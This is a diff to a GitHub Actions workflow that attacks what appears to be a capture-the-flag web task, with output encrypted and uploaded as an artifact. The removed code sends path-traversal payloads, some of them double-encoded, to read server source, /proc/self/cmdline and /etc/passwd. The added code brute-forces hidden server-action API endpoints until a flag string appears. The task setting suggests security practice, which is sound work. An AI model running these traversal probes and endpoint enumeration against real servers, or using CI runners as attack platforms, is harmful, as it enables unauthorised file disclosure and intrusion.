@@ -12,7 +12,7 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Probe limited read-only source disclosure and encrypt hits
+      - name: Probe dynamic paths from public server references
         shell: bash
         run: |
           set -euo pipefail
@@ -30,35 +30,33 @@ jobs:
           -----END PUBLIC KEY-----
           PEM
           python3 - <<'PY'
-          import ssl,socket,pathlib,json
-          host='task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru'; port=443
-          out=pathlib.Path('package/out')
-          paths=[
-            '/server.py','/main.py','/app.py','/__pycache__/server.cpython-313.pyc','/__pycache__/main.cpython-313.pyc',
-            '/static/../server.py','/static/../../server.py','/assets/../server.py','/assets/../../server.py',
-            '/static/%2e%2e/server.py','/static/%2e%2e%2fserver.py','/static/..%2fserver.py','/static/%2e%2e%252fserver.py','/static/%252e%252e%252fserver.py',
-            '/assets/%2e%2e/server.py','/assets/%2e%2e%2fserver.py','/assets/..%2fserver.py','/assets/%252e%252e%252fserver.py',
-            '/static/%2e%2e/__pycache__/server.cpython-313.pyc','/assets/%2e%2e/__pycache__/server.cpython-313.pyc',
-            '/static/../../../proc/self/cmdline','/static/%2e%2e/%2e%2e/%2e%2e/proc/self/cmdline','/assets/%2e%2e/%2e%2e/%2e%2e/proc/self/cmdline',
-            '/static/../../../etc/passwd','/assets/../../../etc/passwd'
-          ]
-          ctx=ssl.create_default_context(); hits=[]
-          for path in paths:
-            try:
-              with socket.create_connection((host,port),timeout=8) as raw:
-                with ctx.wrap_socket(raw,server_hostname=host) as ss:
-                  req=f'GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n'.encode()
-                  ss.sendall(req); data=b''
-                  while True:
-                    chunk=ss.recv(65536)
-                    if not chunk: break
-                    data+=chunk
-                    if len(data)>2_000_000: break
-              head,_,body=data.partition(b'\r\n\r\n'); first=head.split(b'\r\n',1)[0].decode('latin1','replace'); parts=first.split(); status=int(parts[1]) if len(parts)>1 and parts[1].isdigit() else 0
-              if status!=404:
-                hits.append({'path':path,'status':status,'headers':head.decode('latin1','replace'),'body_b64':__import__('base64').b64encode(body[:1_000_000]).decode()})
-            except Exception as e:
-              pass
+          import requests,pathlib,urllib.parse,json,itertools
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
+          out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
+          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']; aid=act['id']; ref='preview-8b11c'
+          h={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':boot['project']}
+          vals=[aid,ref,'inspectDeploy','inspect-deploy','inspect_deploy']
+          paths=set()
+          for v in vals:
+            for root in ['/api/action/','/api/actions/','/api/server-action/','/api/server-actions/','/api/reference/','/api/references/','/api/server-reference/','/api/server-references/','/api/runtime/action/','/api/runtime/actions/']:
+              paths.add(root+v); paths.add(root+v+'/invoke'); paths.add(root+v+'/inspect'); paths.add(root+v+'/export')
+          paths.update([f'/api/actions/invoke/{aid}',f'/api/actions/invoke/{ref}',f'/api/actions/{aid}/invoke',f'/api/actions/{ref}/invoke'])
+          hits=[]
+          bodies=[{}, {'workspaceId':boot['workspace'],'projectId':boot['project']},{'actionId':aid,'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}},{'deployRef':ref},{'ref':ref}]
+          for path in sorted(paths):
+            u=urllib.parse.urljoin(base,path)
+            for method in ['GET','POST']:
+              try:
+                if method=='GET':
+                  r=s.get(u,headers=h,timeout=8,allow_redirects=False)
+                  if r.status_code!=404:hits.append({'path':path,'method':'GET','status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+                else:
+                  for b in bodies:
+                    r=s.post(u,headers=h,json=b,timeout=8,allow_redirects=False)
+                    if r.status_code!=404:
+                      hits.append({'path':path,'method':'POST','sent':b,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+                      if 'caplag{' in r.text: break
+              except Exception: pass
           (out/'summary.json').write_text(json.dumps({'hits':hits},indent=2))
           PY
           tar -C package/out -czf package/result.tgz .
@@ -75,6 +73,6 @@ jobs:
           rm -rf package
       - uses: actions/upload-artifact@v4
         with:
-          name: launchlet-part2-source-encrypted
+          name: launchlet-part2-dynamic-paths-encrypted
           path: artifact/
           retention-days: 1
